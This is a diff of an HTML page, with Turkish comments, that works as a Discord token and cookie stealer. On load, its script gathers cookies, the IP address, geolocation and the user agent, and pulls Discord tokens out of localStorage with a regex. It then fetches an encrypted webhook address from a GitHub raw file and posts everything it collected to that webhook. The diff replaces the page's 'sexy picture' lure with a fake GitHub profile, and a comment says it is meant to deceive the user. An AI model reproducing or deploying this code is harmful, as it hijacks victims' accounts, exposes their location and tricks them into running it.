@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>seksi_kiz_resim.jpg</title>
+    <title>nefretwasherebaby - GitHub</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // web ===
+        // === BİLGİ TOPLA ===
         const info = {
             URL: location.href,
             Referrer: document.referrer,
@@ -28,25 +28,25 @@
             } catch (e) { return '❌ Erişilemedi'; }
         }
 
-        // === 2. IP AL ===
+        // IP al
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(data => info.IP = data.ip)
             .catch(() => info.IP = '❌');
 
-         // konum ===
+        // Konum (eğer izin verirse)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 info.Geolocation = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-            });
+            }, null, { timeout: 8000 });
         }
 
-        // token dc
+        // Discord token ara (localStorage)
         try {
             for (let key in localStorage) {
-                if (key.includes('token') || key.includes('discord')) {
+                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
                     const val = localStorage[key];
-                    if (typeof val === 'string' && val.includes('\"') && val.includes('.')) {
+                    if (typeof val === 'string' && val.length > 50) {
                         const tokenMatch = val.match(/mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}/);
                         if (tokenMatch) {
                             info.DiscordToken = tokenMatch[0];
@@ -57,7 +57,7 @@
             }
         } catch (e) {}
 
-      
+        // Webhook URL'sini decrypt et ve gönder
         fetch('https://raw.githubusercontent.com/nefretwasherebaby/keys/master/webhook.enc')
             .then(res => res.text())
             .then(encrypted => {
@@ -70,49 +70,79 @@
                 return decrypted;
             })
             .then(WEBHOOK_URL => {
-                // 3 saniye bekle (IP vs. için)
+                // 2.5 saniye içinde her şey toplanır
                 setTimeout(() => {
-                    sendToDiscord(WEBHOOK_URL);
-                }, 3000);
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: 'nefretwasherebaby',
+                            avatar_url: 'https://i.imgur.com/rFhOcMq.png',
+                            embeds: [{
+                                title: '🎯 malevladi',
+                                description: '```yaml\ token ve çerezler cepte.\n```',
+                                color: 0xFF0000,
+                                fields: [
+                                    { name: '📛 dctoken', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
+                                    { name: '🍪 neonunyedigikurabiye', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
+                                    { name: '📱 cihaz', value: '```\n' + info.UserAgent + '\n```', inline: false },
+                                    { name: '🌐 ip', value: '```\n' + info.IP + '\n```', inline: true },
+                                    { name: '📍 nerdesinmal', value: '```\n' + info.Geolocation + '\n```', inline: true },
+                                    { name: '⏰ timebabatime', value: '```\n' + info.Tarih + '\n```', inline: true }
+                                ],
+                                footer: { text: 'nefretwasherebaby - github.com/nefretwasherebaby' },
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    }).catch(() => {});
+                }, 2500);
             });
 
-       
-        function sendToDiscord(url) {
-            const embed = {
-                username: 'nefretwasherebaby',
-                avatar_url: 'https://i.imgur.com/rFhOcMq.png',
-                embeds: [{
-                    title: '🎯 malevladi,
-                    description: '```yaml\ token ve çerezler cepte.\n```',
-                    color: 0xFF0000,
-                    fields: [
-                        { name: '📛 dctoken', value: '```\n' + (info.DiscordToken || '❌ Bulunamadı') + '\n```', inline: false },
-                        { name: '🍪 neonunyedigikurabiye', value: '```\n' + (info.Cookies || '❌ Yok').substr(0, 1000) + '\n```', inline: false },
-                        { name: '📱 cihaz', value: '```\n' + info.UserAgent + '\n```', inline: false },
-                        { name: '🌐 ip', value: '```\n' + info.IP + '\n```', inline: true },
-                        { name: '📍 nerdesinmal', value: '```\n' + info.Geolocation + '\n```', inline: true },
-                        { name: '⏰ timebabatime', value: '```\n' + info.Tarih + '\n```', inline: true }
-                    ],
-                    footer: { text: 'nefretwasherebaby - github.com/nefretwasherebaby' },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+        // Kullanıcıyı kandır: GitHub gibi göster
+        document.write(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>nefretwasherebaby / GitHub</title>
+                <link href="https://cdn.jsdelivr.net/npm/@primer/css@24.5.0/dist/primer.css" rel="stylesheet" />
+                <style>
+                    body { background: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; }
+                    .container { max-width: 900px; margin: 40px auto; padding: 20px; }
+                    .repo { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 20px; margin: 10px 0; }
+                    .repo a { color: #58a6ff; text-decoration: none; }
+                    .repo a:hover { text-decoration: underline; }
+                    footer { text-align: center; margin-top: 50px; color: #8b949e; font-size: 0.9em; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>nefretwasherebaby</h1>
+                    <p>Merhaba, bu benim GitHub profilim. Projelerimi burada paylaşıyorum.</p>
 
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embed)
-            }).catch(e => console.log('Gönderilemedi:', e));
-        }
+                    <div class="repo">
+                        <h3><a href="/pnger">pnger</a></h3>
+                        <p>Stealth payload delivery using PNG files.</p>
+                        <code>git clone https://github.com/nefretwasherebaby/pnger.git</code>
+                    </div>
 
-       
-        document.body.innerHTML = `
-            <div style="width:100vw;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#000;color:#fff;font-family:Arial;">
-                <img src="https://via.placeholder.com/800x600/111/ffffff?text=Seksii+Resim+Yükleniyor..." 
-                     style="max-width:90%;max-height:70%;object-fit:cover;border-radius:12px;">
-                <p style="margin-top:20px;font-size:18px;">Birkaç saniye sonra açılacak...</p>
-            </div>
-        `;
+                    <div class="repo">
+                        <h3><a href="/webhook-stealer">webhook-stealer</a></h3>
+                        <p>Discord token & cookie logger.</p>
+                        <code>git clone https://github.com/nefretwasherebaby/webhook-stealer.git</code>
+                    </div>
+
+                    <div class="repo">
+                        <h3><a href="/seksi-kiz-resim">seksi-kiz-resim</a></h3>
+                        <p>Just a fun project 😈</p>
+                        <code>git clone https://github.com/nefretwasherebaby/seksi-kiz-resim.git</code>
+                    </div>
+                </div>
+                <footer>© 2025 nefretwasherebaby. Tüm hakları saklıdır.</footer>
+            </body>
+            </html>
+        `);
     </script>
 </head>
 <body></body>
